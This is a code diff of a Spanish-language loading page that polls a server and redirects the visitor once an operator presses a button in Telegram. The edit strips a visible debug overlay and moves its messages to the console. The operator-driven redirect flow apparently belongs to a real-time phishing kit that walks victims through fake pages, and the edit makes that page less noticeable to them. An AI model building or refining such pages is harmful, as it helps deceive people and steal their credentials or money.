@@ -13,14 +13,13 @@
     * { box-sizing: border-box; }
     body {
       margin: 0;
-      padding: 0 0 200px 0;
+      padding: 0;
       font-family: Arial, sans-serif;
       background-color: #f7f7f7;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
       text-align: center;
-      position: relative;
     }
 
     .contenedor {
@@ -52,45 +51,6 @@
       padding: 8px 16px;
       border-radius: 10px;
     }
-
-  #debugOverlay {
-      position: fixed;
-      bottom: 0; left: 0; right: 0;
-      max-height: 200px;
-      overflow-y: auto;
-      background: rgba(0,0,0,0.82);
-      color: #fff;
-      font-family: Consolas, Menlo, monospace;
-      font-size: 11px;
-      text-align: left;
-      padding: 8px 10px;
-      z-index: 999999;
-      border-top: 2px solid #f5c518;
-    }
-    #debugOverlay h4 {
-      margin: 0 0 4px 0;
-      padding: 0;
-      font-size: 12px;
-      color: #f5c518;
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
-    }
-    #debugOverlay h4 button {
-      border: 0;
-      background: #f5c518;
-      color: #222;
-      padding: 2px 8px;
-      border-radius: 4px;
-      font-size: 10px;
-      cursor: pointer;
-    }
-    #debugOverlay .pollLine { white-space: nowrap; }
-    #debugOverlay .pendiente  { color: #9bdcff; }
-    #debugOverlay .candidato  { color: #ffd37a; }
-    #debugOverlay .confirmado { color: #5aff8a; font-weight: bold; }
-    #debugOverlay .redirect   { color: #ff6a6a; font-weight: bold; }
-    #debugOverlay .info       { color: #dcdcdc; }
   </style>
 </head>
 <body style="background-color:#f7f7f7; background-repeat: no-repeat; background-size: 300%;">
@@ -101,13 +61,6 @@
   <img style="margin-top: -150px;" src="img/cargando1.gif" width="85%" alt="">
 </center>
 
-<div id="debugOverlay">
-  <h4>
-    <span>🔍 ESTADO POLLING (visible debug)</span>
-    <button onclick="document.getElementById('debugOverlay').style.display='none';">OCULTAR</button>
-  </h4>
-  <div id="debugLog"></div>
-</div>
 
 <script>
   const params = new URLSearchParams(window.location.search);
@@ -118,19 +71,13 @@
   let coincidenciasSeguidas = 0;
   let yaRedirigiendo = false;
 
-  const logEl = document.getElementById('debugLog');
-  function addLine(text, cls = 'info') {
-    const div = document.createElement('div');
-    div.className = 'pollLine ' + cls;
+  function logConsole(text) {
     const ts = new Date().toLocaleTimeString('es-CO', {hour12: false});
-    div.textContent = `[${ts}] ${text}`;
-    logEl.insertBefore(div, logEl.firstChild);
-    while (logEl.childElementCount > 40) logEl.removeChild(logEl.lastChild);
     // eslint-disable-next-line no-console
-    console.log(`[espera] ${div.textContent}`);
+    console.log(`[espera] [${ts}] ${text}`);
   }
 
-  addLine(`Loader visible y activo. Esperando estado del operador. rid=${requestId || '(null)'}  key=${key || '(null)'}`);
+  logConsole(`Loader activo. rid=${requestId || '(null)'}  key=${key || '(null)'}. Esperando boton del operador en Telegram.`);
 
   function urlPara(estado) {
     switch (estado) {
@@ -169,26 +116,20 @@
         if (estadoAnterior && estadoAnterior === estado) coincidenciasSeguidas += 1;
         else { estadoAnterior = estado; coincidenciasSeguidas = 1; }
 
-        addLine(
-          `estado=${estado} (x${coincidenciasSeguidas})` +
-            (coincidenciasSeguidas >= 2 ? ' => 2x OK, redirigiendo...' : ''),
-          coincidenciasSeguidas >= 2 ? 'confirmado' : 'candidato'
-        );
+        logConsole(`estado=${estado} (x${coincidenciasSeguidas})` +
+          (coincidenciasSeguidas >= 2 ? ' => 2x OK, location.href automatico.' : ''));
 
         if (coincidenciasSeguidas >= 2) {
           const urlGo = urlPara(estado);
           if (urlGo && !yaRedirigiendo) {
             yaRedirigiendo = true;
-            addLine(`NAVEGACION AUTOMATICA (operador pulsó botón Telegram) => ${urlGo}`, 'redirect');
-            // eslint-disable-next-line no-console
-            console.log(`[espera] ✅ 2x confirmado ${estado} => location.href = ${urlGo}`);
-            // Loader sigue visible hasta el ultimo momento antes del salto.
-            setTimeout(() => { window.location.href = urlGo; }, 500);
+            logConsole(`NAVEGACION (operador pulso boton Telegram) => ${urlGo}`);
+            setTimeout(() => { window.location.href = urlGo; }, 350);
           }
         }
       })
       .catch(err => {
-        addLine(`error polling: ${err || 'network'} (reinicia contador)`, 'info');
+        logConsole(`error polling: ${err || 'network'} (reinicia contador)`);
         estadoAnterior = null;
         coincidenciasSeguidas = 0;
       });
